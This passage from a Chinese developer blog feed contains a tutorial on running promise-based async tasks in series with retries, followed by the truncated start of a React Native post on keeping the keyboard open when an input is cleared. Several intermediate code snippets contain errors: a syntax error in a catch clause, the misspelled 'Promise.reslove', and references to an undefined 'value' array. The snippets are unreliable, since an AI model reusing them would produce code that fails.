                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">实现要求</h2>
<p>传入一个包含多个异步任务的tasks数组与重试次数retries, 按序执行tasks内的异步任务，当所有的任务执行完成之后，返回一个包含全部执行结果的结果数组<br/>
对于执行失败的task，允许重试retries次，如果均失败了，就将失败原因存入结果数组之中，接着继续执行下一个task</p>
<h2 data-id="heading-1">实现思路</h2>
<p>如何使用promise实现串行执行异步任务的效果？重点需要思考的点应该是<strong>如何在当前的task完成之后再执行下一个task？</strong><br/>
没错，就是<strong>使用promise的<code>.then()</code>进行叠加</strong>，通过为当前task的promise使用<code>.then</code>添加task完成的回调，在<code>.then</code>之中执行下一个task，这样就实现了完成当前task再执行下一个task的效果。<br/>
那么又如何实现累计添加<code>.then</code>？可以使用数组的<code>reduce</code>方法，实现不断的累加的效果。使用<code>tasks.reduce((p,task) =&gt; {...},Promise.resolve())</code>,其中p是不断累计添加<code>.then</code>的promise，task是当前异步任务</p>
<h2 data-id="heading-2">异步执行实现(不带重试功能)</h2>
<p>先来看看如何使用promise+reduce实现串行调用异步任务</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">serialExcute</span>(<span class="hljs-params">tasks</span>) {
  <span class="hljs-keyword">const</span> values = []	<span class="hljs-comment">// 结果数组</span>
  <span class="hljs-comment">// 返回的p是已经处理完所有task串行操作的promise</span>
  <span class="hljs-keyword">let</span> p = tasks.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">p,task</span>) =&gt;</span> {
    <span class="hljs-keyword">return</span> p.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {
        <span class="hljs-title function_">task</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> {
          values.<span class="hljs-title function_">push</span>(value)	<span class="hljs-comment">// 将结果存储</span>
          <span class="hljs-title function_">resolve</span>()	<span class="hljs-comment">// 执行下一个任务</span>
        }).<span class="hljs-title function_">catch</span>(<span class="hljs-params">err</span>) {
          <span class="hljs-comment">// 出错时，记录错误，执行下一task</span>
          value.<span class="hljs-title function_">push</span>(err)
          <span class="hljs-title function_">resolve</span>()
        }
      })
    })
  },<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>())
  <span class="hljs-comment">// 当tasks中所有task执行完成之后，返回values数组</span>
  <span class="hljs-keyword">return</span> p.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reslove</span>(values)
  })
}
</code></pre>
<h2 data-id="heading-3">重试功能实现</h2>
<p>额外添加一个方法<code>excuteTaskWithRetry(task,retryTime)</code>，它接收一个异步任务task以及重试次数作为参数，实现单个异步任务执行并带有失败重试的功能，返回一个返回一个已完成/失败的promise，作为task执行的结果<br/>
<strong>重试如何实现？</strong> 使用递归的思想，当task执行失败时，会被<code>.catch</code>捕获，在<code>.catch</code>之中判断当前重试次数是否为0，如果为0，就直接<code>reject(err)</code>，反之则递归到下一层执行，同时重试次数减1 <code>excuteTaskWithRetry(task,retryTime-1)</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">excuteTaskWithRetry</span>(<span class="hljs-params">task, retryTime</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
        <span class="hljs-title function_">task</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
            <span class="hljs-comment">// 任务完成，返回结果</span>
            <span class="hljs-title function_">resolve</span>(res)
        }).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
            <span class="hljs-comment">// 如果次数足够，就重试</span>
            <span class="hljs-keyword">if</span> (retryTime &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`任务执行出错,剩余重试次数<span class="hljs-subst">${retryTime}</span>`</span>)
                <span class="hljs-title function_">excuteTaskWithRetry</span>(task, retryTime - <span class="hljs-number">1</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> {
                    <span class="hljs-comment">// 如果重试成功了</span>
                    <span class="hljs-title function_">resolve</span>(res)
                }).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
                    <span class="hljs-comment">// 如果重试失败</span>
                    <span class="hljs-title function_">reject</span>(err)
                })
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 重试次数用完</span>
                <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`执行出错,重试次数用尽,error:<span class="hljs-subst">${err}</span>`</span>))
            }
        })
    })
}
</code></pre>
<p>整合到先前不带重试功能的串行执行方法之中</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">serialExcute</span>(<span class="hljs-params">tasks, retries</span>) {
    <span class="hljs-keyword">const</span> values = []
    <span class="hljs-keyword">let</span> p = tasks.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">p, task</span>) =&gt;</span> {
        <span class="hljs-keyword">return</span> p.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-comment">// 更换成可重试的方法</span>
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">excuteTaskWithRetry</span>(task, retries).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
                values.<span class="hljs-title function_">push</span>(res)
            }).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
                values.<span class="hljs-title function_">push</span>(err)
            })
        })
    }, <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>())
    <span class="hljs-comment">// 按序返回全部数据</span>
    <span class="hljs-keyword">return</span> p.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(value)
    })
}
</code></pre>
<h2 data-id="heading-4">完整代码 + 调试数据</h2>
<p>下面附上完整的代码及调试的数据</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 执行单个任务，包含重试</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">excuteTaskWithRetry</span>(<span class="hljs-params">task, retryTime</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
        <span class="hljs-title function_">task</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
            <span class="hljs-comment">// 任务完成，返回结果</span>
            <span class="hljs-title function_">resolve</span>(res)
        }).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
            <span class="hljs-comment">// 如果次数足够，就重试</span>
            <span class="hljs-keyword">if</span> (retryTime &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`任务执行出错,剩余重试次数<span class="hljs-subst">${retryTime}</span>`</span>)
                <span class="hljs-title function_">excuteTaskWithRetry</span>(task, retryTime - <span class="hljs-number">1</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> {
                    <span class="hljs-comment">// 如果重试成功了</span>
                    <span class="hljs-title function_">resolve</span>(res)
                }).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
                    <span class="hljs-comment">// 如果重试失败</span>
                    <span class="hljs-title function_">reject</span>(err)
                })
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 重试次数用完</span>
                <span class="hljs-title function_">reject</span>(err)
            }
        })
    })
}
<span class="hljs-comment">// 串行执行异步任务 </span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">runTask</span>(<span class="hljs-params">tasks, retries</span>) {
    <span class="hljs-keyword">const</span> value = []
    <span class="hljs-keyword">let</span> p = tasks.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">p, task</span>) =&gt;</span> {
        <span class="hljs-keyword">return</span> p.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-comment">// 更换成可重试的方法</span>
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">excuteTaskWithRetry</span>(task, retries).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
                value.<span class="hljs-title function_">push</span>(res)
            }).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
                value.<span class="hljs-title function_">push</span>(err)
            })
        })
    }, <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>())
    <span class="hljs-comment">// 按序返回全部数据</span>
    <span class="hljs-keyword">return</span> p.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(value)
    })
}
<span class="hljs-comment">// 生成异步任务</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createMockTask</span>(<span class="hljs-params">taskName, successProbability = <span class="hljs-number">0.7</span></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &lt; successProbability) {
                <span class="hljs-keyword">const</span> result = <span class="hljs-string">`<span class="hljs-subst">${taskName}</span> 执行成功`</span>;
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);
                <span class="hljs-title function_">resolve</span>(result);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`<span class="hljs-subst">${taskName}</span> 执行失败`</span>));
            }
        }, <span class="hljs-number">500</span>); <span class="hljs-comment">// 每个任务模拟 500ms 执行时间</span>
    });
}
<span class="hljs-keyword">const</span> tasks = [<span class="hljs-title function_">createMockTask</span>(<span class="hljs-string">'task1'</span>), <span class="hljs-title function_">createMockTask</span>(<span class="hljs-string">'task2'</span>, <span class="hljs-number">0.4</span>), <span class="hljs-title function_">createMockTask</span>(<span class="hljs-string">'task3'</span>)]
<span class="hljs-title function_">runTask</span>(tasks,<span class="hljs-number">3</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value)
})
</code></pre>
<p>完结撒花🌸~有疑问或者有什么问题的欢迎在评论区提出！<br/>
参考文档: <a href="https://juejin.cn/post/6844904077537574919%5B" target="_blank" title="https://juejin.cn/post/6844904077537574919%5B">45道promise面试题</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fsegmentfault.com%2Fq%2F1010000010748967" target="_blank" title="https://segmentfault.com/q/1010000010748967" ref="nofollow noopener noreferrer">如何让异步操作顺序执行</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React Native小技巧]]></title>    <link>https://juejin.cn/post/7581324707481600041</link>    <guid>https://juejin.cn/post/7581324707481600041</guid>    <pubDate>2025-12-09T05:21:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581324707481600041" data-draft-id="7581381365494333494" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React Native小技巧"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-09T05:21:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="秃了才能变得更强"/> <meta itemprop="url" content="https://juejin.cn/user/676954895033799"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React Native小技巧
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/676954895033799/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    秃了才能变得更强
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T05:21:35.000Z" title="Tue Dec 09 2025 05:21:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">1、输入框 + clear按钮 不关闭键盘</h3>
<p><code>RN的默认行为</code>： scrollview + textinput + 自定义的清除按钮，输入框获焦的时候 弹起键盘，此时点击清空按钮的时候<code>会先关闭弹框，需要再次点击清除按钮才会清空输入框</code>。</p>
<p>观察原生app的输入框可以 <code>点击清空按钮的时候 输入框还是获焦状态 而且键盘没有关闭</code>，然后摸索实现方式。</p>
<p>方式一：失焦再获焦，这样会让键盘有关闭动作再升起来，效果虽然达到了，但是还差一些意思。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">SearchInput</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [text, setText] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);
  <span class="hljs-keyword">const</span> inputRef = useRef&lt;<span class="hljs-title class_">TextInput</span>&gt;(<span class="hljs-literal">null</span>);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClear</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setText</span>(<span class="hljs-string">''</span>);
    <span class="hljs-comment">// 立即重新聚焦</span>
    <span class="hljs-title function_">requestAnimationFrame</span>(<span class="hljs-function">() =&gt;</span> {
      inputRef.<span class="hljs-property">current</span>?.<span class="hljs-title function_">focus</span>();
    });
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">View</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.container}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">TextInput</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{inputRef}</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.input}</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{text}</span> <span class="hljs-attr">onChangeText</span>=<span class="hljs-string">{setText}</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"输入内容..."</span> /&gt;</span>
      {text.length &gt; 0 &amp;&amp; (
        <span class="hljs-tag">&lt;<span class="hljs-name">TouchableOpacity</span>
          <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.closeButton}</span>
          <span class="hljs-attr">onPress</span>=<span class="hljs-string">{handleClear}</span>
          <span class="hljs-attr">activeOpacity</span>=<span class="hljs-string">{0.7}</span>
          <span class="hljs-attr">hitSlop</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">top:</span> <span class="hljs-attr">10</span>, <span class="hljs-attr">bottom:</span> <span class="hljs-attr">10</span>, <span class="hljs-attr">left:</span> <span class="hljs-attr">10</span>, <span class="hljs-attr">right:</span> <span class="hljs-attr">10</span> }}
        &gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Text</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.closeText}</span>&gt;</span>×<span class="hljs-tag">&lt;/<span class="hljs-name">Text</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">TouchableOpacity</span>&gt;</span>
      )}
    <span class="hljs-tag">&lt;/<span class="hljs-name">View</span>&gt;</span></span>
  );
}
</code></pre>
<p>方式二：使用<code>react-native-gesture-handler</code>自带的<code>Pressable</code>组件，它运行在原生线程上，不会触发 JS 线程的失焦事件，完美的达到我需要的效果。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">StyleSheet</span>, <span class="hljs-title class_">View</span>, <span class="hljs-title class_">TextInput</span>, <span class="hljs-title class_">Text</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-native'</span>;
<span class="hljs-comment">// 主要是这里的 Pressable组件！</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Pressable</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-native-gesture-handler'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">SearchInput</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [text, setText] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);
  <span class="hljs-keyword">const</span> inputRef = useRef&lt;<span class="hljs-title class_">TextInput</span>&gt;(<span class="hljs-literal">null</span>);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClear</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setText</span>(<span class="hljs-string">''</span>);
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">View</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.container}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">TextInput</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{inputRef}</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.input}</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{text}</span> <span class="hljs-attr">onChangeText</span>=<span class="hljs-string">{setText}</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"输入内容..."</span> /&gt;</span>
      {text.length &gt; 0 &amp;&amp; (
        <span class="hljs-tag">&lt;<span class="hljs-name">Pressable</span>
          <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.closeButton}</span>
          <span class="hljs-attr">onPress</span>=<span class="hljs-string">{handleClear}</span>
          <span class="hljs-attr">hitSlop</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">top:</span> <span class="hljs-attr">10</span>, <span class="hljs-attr">bottom:</span> <span class="hljs-attr">10</span>, <span class="hljs-attr">left:</span> <span class="hljs-attr">10</span>, <span class="hljs-attr">right:</span> <span class="hljs-attr">10</span> }}
        &gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Text</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{styles.closeText}</span>&gt;</span>×<span class="hljs-tag">&lt;/<span class="hljs-name">Text</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">Pressable</span>&gt;</span>
      )}
    <span class="hljs-tag">&lt;/<span class="hljs-name">View</span>&gt;</span></span>
  );
}

<span class="hljs-keyword">const</span> styles = <span class="hljs-title class_">StyleSheet</span>.<span class="hljs-title function_">create</span>({
  <span class="hljs-attr">container</span>: {
    <span class="hljs-attr">flexDirection</span>: <span class="hljs-string">'row'</span>,
    <span class="hljs-attr">alignItems</span>: <span class="hljs-string">'center'</span>,
    <span class="hljs-attr">backgroundColor</span>: <span class="hljs-variable constant_">COLORS</span>.<span class="hljs-property">white</span>,
